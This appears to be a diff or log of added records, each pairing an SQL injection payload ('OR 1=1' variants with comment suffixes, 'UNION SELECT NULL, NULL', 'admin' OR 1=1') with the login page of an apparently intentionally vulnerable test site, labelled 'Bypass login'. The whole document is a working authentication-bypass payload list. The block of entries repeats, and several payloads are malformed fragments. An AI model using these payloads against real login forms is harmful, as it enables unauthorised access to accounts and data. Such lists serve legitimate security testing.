+{'type': 'Error-based', 'payload': "' OR 1=1 --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1 ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "admin' OR 1=1  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' OR 1=1 # SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  AND ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  OR ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "1' UNION SELECT NULL, NULL --  SLEEP(", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* -- ", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* #", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* /*", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
+{'type': 'Error-based', 'payload': "' AND 1=1 /* */", 'url': 'http://testphp.vulnweb.com/login.php', 'field': 'username', 'method': 'Bypass login'}
